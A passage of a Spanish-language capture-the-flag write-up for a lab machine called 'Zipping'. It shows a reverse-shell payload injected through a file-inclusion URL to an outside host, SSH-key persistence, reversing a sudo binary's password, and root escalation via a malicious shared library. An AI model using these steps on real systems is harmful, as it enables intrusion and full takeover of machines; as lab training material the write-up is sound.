+<pre tabindex="0"><code>http://10.129.229.87/shop/index.php?page=/dev/shm/pointed&amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.80/443%200%3E%261%22
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.80<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.87<span style="color:#f92672">]</span> <span style="color:#ae81ff">39240</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1098<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>rektsu@zipping:/var/www/html/shop$
+</span></span></code></pre></div><p>Podemos ver la flag de usuario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:/home/rektsu$ cat user.txt
+</span></span><span style="display:flex;"><span>cat user.txt
+</span></span><span style="display:flex;"><span>8de5cae4a28aeac59....
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Enumerando la máquina, vemos que podemos ejecutar como el usuario que queramos el binario <code>stock</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:/$ sudo -l
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> rektsu on zipping:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User rektsu may run the following commands on zipping:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/stock
+</span></span></code></pre></div><p>Me pide una password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:/$ sudo /usr/bin/stock test
+</span></span><span style="display:flex;"><span>sudo /usr/bin/stock test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter the password: Invalid password, please try again.
+</span></span></code></pre></div><p>Ya que la shell no es muy estable, voy a establecer persistencia añadiendo mi clave pública al <code>authorized_keys</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:/home/rektsu/.ssh$ echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs/aNkke9LIHvwrIqFLiLavlSa5gVzvG6EibfhsRDbRY0DLzVMaWw2TmVJ/sjcWBg7DqGFJaJ70cqh7rCX9WYQnUTQUoo...&#34;</span> &gt; authorized_keys
+</span></span><span style="display:flex;"><span>&lt;hQlNkARQb9XM8<span style="color:#f92672">=</span> pointedsec@parrot<span style="color:#e6db74">&#34; &gt; authorized_keys
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh rektsu@10.129.252.223
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.10 <span style="color:#f92672">(</span>GNU/Linux 5.19.0-46-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span>not required on a system that users <span style="color:#66d9ef">do</span> not log into.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sat Aug  <span style="color:#ae81ff">3</span> 20:04:00 <span style="color:#ae81ff">2024</span> from 10.10.14.80
+</span></span><span style="display:flex;"><span>rektsu@zipping:~$
+</span></span></code></pre></div><h2 id="reversing-stock">Reversing <code>stock</code></h2>
+<p>Abriendo el binario en <code>ghidra</code></p>
+<p>Vemos la contraseña.
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>Si la contraseña es válida, vemos que con <code>dlopen()</code> se carga una librería compartida. Pero el nombre de esta está ofuscado.
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Podemos hacer un script en Python para intentar obtener el valor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_decrypt</span>(data, key):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Convertir los datos y la clave a bytes</span>
+</span></span><span style="display:flex;"><span>    data_bytes <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)
+</span></span><span style="display:flex;"><span>    key_bytes <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">8</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Aplicar XOR</span>
+</span></span><span style="display:flex;"><span>    decrypted_bytes <span style="color:#f92672">=</span> bytes([data_bytes[i] <span style="color:#f92672">^</span> key_bytes[i <span style="color:#f92672">%</span> len(key_bytes)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data_bytes))])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decrypted_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Valores iniciales</span>
+</span></span><span style="display:flex;"><span>local_e8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2d17550c0c040967</span>
+</span></span><span style="display:flex;"><span>local_f0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x657a69616b6148</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Descifrar</span>
+</span></span><span style="display:flex;"><span>descifrado_bytes <span style="color:#f92672">=</span> xor_decrypt(local_e8, local_f0)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Imprimir los bytes y la cadena</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Descifrado (bytes): </span><span style="color:#e6db74">{</span>descifrado_bytes<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Descifrado (string): </span><span style="color:#e6db74">{</span>descifrado_bytes<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verificar si la longitud del resultado sugiere más datos</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(descifrado_bytes) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;El valor descifrado parece ser incompleto.&#34;</span>)
+</span></span></code></pre></div><p>El valor está incompleto, pero bien, ya sabemos que la librería está en /home/r&hellip; y nuestro usuario se llama <code>rektsu</code> y es el único usuario que tiene un directorio personal en <code>/home</code></p>
+<p>Ahora solo falta saber cual es la localización de librería compartida que está utilizando para ver si podemos modificarla y escalar privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 decrypt.py 
+</span></span><span style="display:flex;"><span>Descifrado <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>: 2f686f6d652f722d
+</span></span><span style="display:flex;"><span>Descifrado <span style="color:#f92672">(</span>string<span style="color:#f92672">)</span>: /home/r-
+</span></span></code></pre></div><p>Mi reto era intentar descubrir donde estaba la librería de forma estática, pero con <code>ltrace</code> podemos descubrirlo muy fácilmente.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<h2 id="creating-evil-shared-library">Creating Evil Shared Library</h2>
+<p>La librería compartida entonces es:
+<code>/home/rektsu/.config/libcounter.so</code></p>
+<p>Ahora solo falta explotarlo.
+Creamos un <code>libcounter.c</code> en <code>/home/rektsu/.config/</code>
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>Ahora compilamos este archivo con <code>gcc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:~/.config$ gcc -shared -fPIC -nostartfiles -o libcounter.so libcounter.c 
+</span></span><span style="display:flex;"><span>rektsu@zipping:~/.config$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">2</span> rektsu rektsu  <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span> 20:26 .
+</span></span><span style="display:flex;"><span>drwxr-x--x <span style="color:#ae81ff">7</span> rektsu rektsu  <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> rektsu rektsu   <span style="color:#ae81ff">116</span> Aug  <span style="color:#ae81ff">3</span> 20:26 libcounter.c
+</span></span><span style="display:flex;"><span>-rwxrwxr-x <span style="color:#ae81ff">1</span> rektsu rektsu <span style="color:#ae81ff">14272</span> Aug  <span style="color:#ae81ff">3</span> 20:26 libcounter.so
+</span></span></code></pre></div><p>Y ahora solo falta ejecutar el binario como sudo y poner la contraseña, si todo sale bien se debería de cargar nuestra librería compartida maliciosa y se debería de ejecutar una <code>/bin/bash</code> con máximos privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rektsu@zipping:~/.config$ sudo stock
+</span></span><span style="display:flex;"><span>Enter the password: St0ckM4nager
+</span></span><span style="display:flex;"><span>root@zipping:/home/rektsu/.config# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>root@zipping:/home/rektsu/.config# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>root@zipping:/home/rektsu/.config#
+</span></span></code></pre></div><p>Y ya podríamos leer la flag de super usuario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@zipping:~# cd /root
+</span></span><span style="display:flex;"><span>root@zipping:~# ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">6</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span> 20:00 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Oct <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2023</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Jan <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Apr <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> .cache
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> .launchpadlib
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Apr <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2022</span> .profile
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">27</span> Aug  <span style="color:#ae81ff">3</span> 20:09 .stock.csv
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">165</span> Aug  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2023</span> .wget-hsts
+</span></span><span style="display:flex;"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">33</span> Aug  <span style="color:#ae81ff">3</span> 20:00 root.txt
+</span></span><span style="display:flex;"><span>root@zipping:~# cat root.txt
+</span></span><span style="display:flex;"><span>65ea9aab4a320db....
+</span></span><span style="display:flex;"><span>root@zipping:~# 
+</span></span></code></pre></div><p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
